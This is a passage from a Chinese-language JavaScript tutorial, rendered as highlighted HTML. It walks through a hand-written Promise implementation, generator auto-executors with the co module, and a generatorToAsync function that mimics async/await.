    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  
  <span class="token keyword">catch</span><span class="token punctuation">(</span>onRejected<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 添加catch方法</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">,</span> onRejected<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  
  <span class="token keyword">finally</span><span class="token punctuation">(</span>cb<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 添加finally方法</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>
      <span class="token parameter">value</span> <span class="token operator">=&gt;</span> MyPromise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token function">cb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> value<span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token parameter">reason</span> <span class="token operator">=&gt;</span> MyPromise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token function">cb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> <span class="token keyword">throw</span> reason <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  
  <span class="token keyword">static</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 添加静态resolve方法</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token keyword">instanceof</span> <span class="token class-name">MyPromise</span><span class="token punctuation">)</span> <span class="token keyword">return</span> value <span class="token comment">// 如果参数是MyPromise实例，直接返回这个实例</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">MyPromise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=&gt;</span> <span class="token function">resolve</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">static</span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token parameter">reason</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 添加静态reject方法</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">MyPromise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">reject</span><span class="token punctuation">(</span>reason<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">static</span> <span class="token function">all</span><span class="token punctuation">(</span><span class="token parameter">list</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 添加静态all方法</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">MyPromise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">let</span> values <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">//返回值的集合</span>
      <span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token number">0</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> <span class="token punctuation">[</span>i<span class="token punctuation">,</span> p<span class="token punctuation">]</span> <span class="token keyword">of</span> list<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 数组参数如果不是MyPromise实例，先调用MyPromise.resolve</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
          values<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> res
          count<span class="token operator">++</span>
          <span class="token comment">// 所有状态都变成fulfilled时返回的MyPromise状态就变成fulfilled</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">===</span> list<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token function">resolve</span><span class="token punctuation">(</span>values<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token parameter">err</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
          <span class="token function">reject</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token comment">// 有一个被rejected时返回的MyPromise状态就变成rejected</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">static</span> <span class="token function">race</span><span class="token punctuation">(</span><span class="token parameter">list</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 添加静态race方法</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">MyPromise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> p <span class="token keyword">of</span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//注意这里的遍历跟上面不一样；</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token comment">// 只要有一个实例率先改变状态，新的MyPromise的状态就跟着改变</span>
          <span class="token function">resolve</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token parameter">err</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
          <span class="token function">reject</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br><span class="line-number">132</span><br><span class="line-number">133</span><br><span class="line-number">134</span><br><span class="line-number">135</span><br><span class="line-number">136</span><br><span class="line-number">137</span><br><span class="line-number">138</span><br><span class="line-number">139</span><br><span class="line-number">140</span><br><span class="line-number">141</span><br><span class="line-number">142</span><br><span class="line-number">143</span><br><span class="line-number">144</span><br><span class="line-number">145</span><br><span class="line-number">146</span><br><span class="line-number">147</span><br><span class="line-number">148</span><br><span class="line-number">149</span><br><span class="line-number">150</span><br><span class="line-number">151</span><br><span class="line-number">152</span><br><span class="line-number">153</span><br><span class="line-number">154</span><br><span class="line-number">155</span><br><span class="line-number">156</span><br><span class="line-number">157</span><br><span class="line-number">158</span><br><span class="line-number">159</span><br><span class="line-number">160</span><br><span class="line-number">161</span><br><span class="line-number">162</span><br><span class="line-number">163</span><br><span class="line-number">164</span><br><span class="line-number">165</span><br><span class="line-number">166</span><br><span class="line-number">167</span><br><span class="line-number">168</span><br><span class="line-number">169</span><br><span class="line-number">170</span><br><span class="line-number">171</span><br><span class="line-number">172</span><br><span class="line-number">173</span><br><span class="line-number">174</span><br><span class="line-number">175</span><br><span class="line-number">176</span><br><span class="line-number">177</span><br></div></div><h4 id="_4-generator-co"><a href="#_4-generator-co" class="header-anchor">#</a> 4:generator/co</h4> <p><strong>由于yield表达式可以暂停执行，next方法可以恢复执行</strong>，这使得Generator函数很适合用来将异步任务同步化。</p> <p><strong>通过co模块，实际上就是将run函数和thunk(thunkify)函数进行了封装</strong>，并且yield表达式同时支持thunk(thunkify)函数和Promise对象两种形式，使得自动流程控制更加的方便。</p> <p>co模块的原理：co模块其实就是<strong>将两种自动执行器(thunk(thunkify)函数和Promise对象)，包装成一个模块。</strong></p> <p><strong>分类组合</strong></p> <ul><li><strong>generator + 回调函数</strong></li> <li><strong>generator + Promise</strong>： 除了<code>Thunk</code>函数，我们还可以借助<code>Promise</code>对象来执行 generator 函数。</li> <li><strong>generator + co 模块</strong>
node.js 中的**<code>co</code>模块是一个用来自动执行<code>generator</code>函数的模块**，它的入口是一个<code>co(gen)</code>函数，它预期接收一个 generator 对象或者 generator 函数作为参数，返回一个<code>Promise</code>对;</li></ul> <p><code>next方法</code>执行后会返回一个对象，对象中有<code>value 和 done</code>两个属性</p> <ul><li>value：暂停点后面接的值，也就是yield后面接的值</li> <li>done：是否generator函数已走完，没走完为false，走完为true</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span><span class="token operator">*</span> <span class="token function">gen</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">yield</span> <span class="token number">1</span>
  <span class="token keyword">yield</span> <span class="token number">2</span>
  <span class="token keyword">yield</span> <span class="token number">3</span>
<span class="token punctuation">}</span>
<span class="token keyword">const</span> g <span class="token operator">=</span> <span class="token function">gen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// { value: 1, done: false }</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// { value: 2, done: false }</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// { value: 3, done: false }</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// { value: undefined, done: true }</span>

<span class="token keyword">function</span><span class="token operator">*</span> <span class="token function">gen</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">yield</span> <span class="token number">1</span>
  <span class="token keyword">yield</span> <span class="token number">2</span>
  <span class="token keyword">yield</span> <span class="token number">3</span>
  <span class="token keyword">return</span> <span class="token number">4</span>
<span class="token punctuation">}</span>
<span class="token keyword">const</span> g <span class="token operator">=</span> <span class="token function">gen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// { value: 1, done: false }</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// { value: 2, done: false }</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// { value: 3, done: false }</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// { value: 4, done: true }</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><h5 id="自动执行"><a href="#自动执行" class="header-anchor">#</a> 自动执行</h5> <p><strong>要点</strong>: g.next() 后的res是否为done, 如果是done的话直接return res.value; 如果不是的话再次then循环；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token function-variable function">run</span> <span class="token operator">=</span> <span class="token parameter">gen</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> g <span class="token operator">=</span> <span class="token function">gen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">const</span> <span class="token function-variable function">next</span> <span class="token operator">=</span> <span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> result <span class="token operator">=</span> g<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span>done<span class="token punctuation">)</span> <span class="token keyword">return</span> result<span class="token punctuation">.</span>value
    result<span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token function">next</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> <span class="token function-variable function">run</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">gen</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> g <span class="token operator">=</span> <span class="token function">gen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">let</span> <span class="token function-variable function">next</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> <span class="token punctuation">{</span> done<span class="token punctuation">,</span> value <span class="token punctuation">}</span> <span class="token operator">=</span> g<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>done<span class="token punctuation">)</span> <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    value<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token function">next</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><h5 id="手动执行"><a href="#手动执行" class="header-anchor">#</a> 手动执行</h5> <p>手动执行<strong>其实就是用then方法，层层添加回调函数</strong>。<em>详见下下面的手动编写；</em></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> g <span class="token operator">=</span> <span class="token function">gen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
g<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    g<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> g<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token parameter">err</span> <span class="token operator">=&gt;</span> g<span class="token punctuation">.</span><span class="token function">throw</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token parameter">err</span> <span class="token operator">=&gt;</span> g<span class="token punctuation">.</span><span class="token function">throw</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h4 id="_5-async-await"><a href="#_5-async-await" class="header-anchor">#</a> 5:async/await</h4> <h5 id="说明总括"><a href="#说明总括" class="header-anchor">#</a> 说明总括</h5> <ul><li><strong>await只能在async函数中使用</strong>，不然会报错</li> <li>async函数返回的是一个Promise对象，有无值看有无return值</li> <li>await后面最好是接Promise，虽然接其他值也能达到排队效果</li> <li>async/await作用是<strong>用同步方式，执行异步操作</strong></li></ul> <h5 id="自定义实现-3"><a href="#自定义实现-3" class="header-anchor">#</a> 自定义实现</h5> <p><strong>node7.6 以上的版本</strong>引入了一个 <strong>ES7 的新特性 Async/Await</strong> 是专门用于控制异步代码。为了使异步操作得更加方便，<strong>本质上 async 函数是 Generator 函数的语法糖。</strong></p> <blockquote><p><code>async</code>函数是<code>generator</code>函数的语法糖，它相对于一个自带执行器（如 co 模块）的<code>generator</code>函数。
<code>async</code>函数中的<code>await</code>关键字预期接收一个<code>Promise</code>对象，如果不是 Promise 对象则返回原值，这使得它的适用性比 co 执行器更广。</p></blockquote> <p>它就是 Generator 函数的语法糖，async 函数的实现原理，<strong>就是将 Generator 函数和自动执行器，包装在一个函数里。</strong>、跟co的一致；</p> <p>async函数是基于generator实现，所以涉及到generator相关知识。<strong>在没有async函数之前，通常使用co库来执行generator，所以通过co我们也能模拟async的实现。</strong> <img src="/rat-summ/assets/img/19-44-20.9f248d76.jpg" alt="async"></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">generatorToAsync</span><span class="token punctuation">(</span><span class="token parameter">generatorFn</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> gen <span class="token operator">=</span> <span class="token function">generatorFn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span> <span class="token comment">// gen有可能传参</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> <span class="token comment">// 返回一个Promise</span>
      <span class="token keyword">function</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token parameter">key<span class="token punctuation">,</span> arg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">let</span> res
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
          res <span class="token operator">=</span> gen<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token comment">// 这里有可能会执行返回reject状态的Promise</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">return</span> <span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token comment">// 报错的话会走catch，直接reject</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">const</span> <span class="token punctuation">{</span> value<span class="token punctuation">,</span> done <span class="token punctuation">}</span> <span class="token operator">=</span> res <span class="token comment">// 解构获得value和done</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>done<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">resolve</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token comment">// 如果done为true，说明走完了，进行resolve(value)</span>
        <span class="token comment">// 如果done为false，说明没走完，还得继续走; value有可能是：常量，Promise，Promise有可能是成功或者失败</span>
        <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">val</span> <span class="token operator">=&gt;</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token string">'next'</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token parameter">err</span> <span class="token operator">=&gt;</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token string">'throw'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span>
      <span class="token function">next</span><span class="token punctuation">(</span><span class="token string">&quot;next&quot;</span><span class="token punctuation">)</span> <span class="token comment">// 第一次执行</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p><code>async/await</code>版本</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">asyncFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> num1 <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>num1<span class="token punctuation">)</span> <span class="token comment">// 2</span>
  <span class="token keyword">const</span> num2 <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fn</span><span class="token punctuation">(</span>num1<span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>num2<span class="token punctuation">)</span> <span class="token comment">// 4</span>
  <span class="token keyword">const</span> num3 <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fn</span><span class="token punctuation">(</span>num2<span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>num3<span class="token punctuation">)</span> <span class="token comment">// 8</span>
  <span class="token keyword">return</span> num3
<span class="token punctuation">}</span>
<span class="token keyword">const</span> asyncRes <span class="token operator">=</span> <span class="token function">asyncFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>asyncRes<span class="token punctuation">)</span> <span class="token comment">// Promise</span>
asyncRes<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 8</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>使用<code>generatorToAsync函数</code>的版本</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span><span class="token operator">*</span> <span class="token function">gen</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
